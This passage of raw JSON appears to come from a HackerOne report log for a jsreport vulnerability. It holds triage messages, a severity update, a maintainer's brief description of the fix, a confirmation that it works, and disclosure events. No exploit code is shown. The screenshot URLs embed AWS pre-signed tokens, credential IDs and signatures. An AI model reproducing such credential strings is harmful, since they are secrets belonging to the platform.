href=\"/ktistai\"\u003e@Ktistai\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-31T08:03:27.774Z","updated_at":"2019-07-31T08:03:27.774Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"attachments":[{"id":543704,"filename":"Screenshot_2019-07-30_at_11.37.38.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/543/704/09fed5303a62c921fcfcd739b40e81c254b1735a/Screenshot_2019-07-30_at_11.37.38.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-07-30_at_11.37.38.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-07-30_at_11.37.38.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063431Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=f6c05a5074b8d0ae893a096fb30f798f62e7bce0d509d6168c9f59762a35813a"},{"id":543703,"filename":"Screenshot_2019-07-30_at_11.37.44.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/543/703/e022371d80a8644e930149f99b6c93c797999e8d/Screenshot_2019-07-30_at_11.37.44.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-07-30_at_11.37.44.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-07-30_at_11.37.44.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063431Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=afdd6f32dcc1304ae3898fae8b7b5379c2cf0c501a7b7a2177c71fd57bc80fad"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5469249,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"@ktistai \nwell, first theory is that you didn't save `pwn.js` file, there is * near filename, ensure that pwn.js is saved, you can just hit Ctrl+S while in the pwn.js tab and try again\nif it doesn't work i'll think it through","markdown_message":"\u003cp\u003e\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e \u003cbr\u003e\nwell, first theory is that you didn\u0026#39;t save \u003ccode\u003epwn.js\u003c/code\u003e file, there is * near filename, ensure that pwn.js is saved, you can just hit Ctrl+S while in the pwn.js tab and try again\u003cbr\u003e\nif it doesn\u0026#39;t work i\u0026#39;ll think it through\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-31T10:34:24.304Z","updated_at":"2019-07-31T10:34:24.304Z","actor":{"username":"ermilov","cleared":false,"url":"/ermilov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5479080,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @inkz\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@ktistai","markdown_message":"\u003cp\u003eHello \u003ca href=\"/inkz\"\u003e@inkz\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-01T11:26:42.035Z","updated_at":"2019-08-01T11:26:42.035Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5479146,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-01T11:38:40.401Z","updated_at":"2019-08-01T11:38:40.401Z","additional_data":{"old_severity":"High","new_severity":"High (8.0)","old_severity_id":477709,"new_severity_id":483157},"actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6948482,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T09:09:03.210Z","updated_at":"2020-02-03T09:09:03.210Z","actor":{"username":"pofider","cleared":false,"url":"/pofider","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6948556,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I believe this was fixed at the same time as https://hackerone.com/reports/660563.\n\nThe idea of the fix was that the scripts manager workers only accept requests with security hash that only the scripts manager knows and include in them.\n\nThe fix was already released to the users.","markdown_message":"\u003cp\u003eI believe this was fixed at the same time as \u003ca title=\"https://hackerone.com/reports/660563\" href=\"https://hackerone.com/reports/660563\"\u003ehttps://hackerone.com/reports/660563\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe idea of the fix was that the scripts manager workers only accept requests with security hash that only the scripts manager knows and include in them.\u003c/p\u003e\n\n\u003cp\u003eThe fix was already released to the users.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-03T09:15:38.289Z","updated_at":"2020-02-03T09:15:38.289Z","actor":{"username":"pofider","cleared":false,"url":"/pofider","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6948564,"is_internal":false,"editable":false,"type":"Activities::ExternalUserRemoved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T09:17:18.312Z","updated_at":"2020-02-03T09:17:18.312Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"removed_user":{"url":"/pofider","username":"pofider"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6957805,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ermilov @ktistai can you confirm this vulnerability has been fixed properly? Then I could proceed with disclosure. Thanks!","markdown_message":"\u003cp\u003e\u003ca href=\"/ermilov\"\u003e@ermilov\u003c/a\u003e \u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e can you confirm this vulnerability has been fixed properly? Then I could proceed with disclosure. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-04T09:14:15.692Z","updated_at":"2020-02-04T09:14:15.692Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6957855,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@marcinhoppe ok, I'll check it soon.","markdown_message":"\u003cp\u003e\u003ca href=\"/marcinhoppe\"\u003e@marcinhoppe\u003c/a\u003e ok, I\u0026#39;ll check it soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-04T09:16:38.084Z","updated_at":"2020-02-04T09:16:38.084Z","actor":{"username":"ermilov","cleared":false,"url":"/ermilov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6977205,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ermilov were you able to verify if the issue was fixed, too?","markdown_message":"\u003cp\u003e\u003ca href=\"/ermilov\"\u003e@ermilov\u003c/a\u003e were you able to verify if the issue was fixed, too?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-06T09:30:35.109Z","updated_at":"2020-02-06T09:30:35.109Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6978293,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@marcinhoppe Yes, I verify that the issue is no longer present in the new version of the `jsreport`.\nSorry for the delay again.","markdown_message":"\u003cp\u003e\u003ca href=\"/marcinhoppe\"\u003e@marcinhoppe\u003c/a\u003e Yes, I verify that the issue is no longer present in the new version of the \u003ccode\u003ejsreport\u003c/code\u003e.\u003cbr\u003e\nSorry for the delay again.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-06T12:23:02.319Z","updated_at":"2020-02-06T12:23:02.319Z","actor":{"username":"ermilov","cleared":false,"url":"/ermilov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6985204,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks. I will disclose this vulnerability now.","markdown_message":"\u003cp\u003eThanks. I will disclose this vulnerability now.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-07T08:56:29.431Z","updated_at":"2020-02-07T08:56:29.431Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6985205,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-07T08:56:40.510Z","updated_at":"2020-02-07T08:56:40.510Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ermilov","url":"/ermilov"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6985206,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-07T08:56:46.432Z","updated_at":"2020-02-07T08:56:46.432Z","first_to_agree":true,"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6986963,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-07T12:15:01.490Z","updated_at":"2020-02-07T12:15:01.490Z","actor":{"username":"ermilov","cleared":false,"url":"/ermilov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6986964,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-07T12:15:01.536Z","updated_at":"2020-02-07T12:15:01.536Z","actor":{"username":"ermilov","cleared":false,"url":"/ermilov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6988486,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-07T15:23:15.643Z","updated_at":"2020-02-07T15:23:15.643Z","first_to_agree":true,"actor":{"username":"markerparker","cleared":false,"url":"/markerparker","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6988495,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-07T15:24:08.699Z","updated_at":"2020-02-07T15:24:08.699Z","actor":{"username":"markerparker","cleared":false,"url":"/markerparker","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}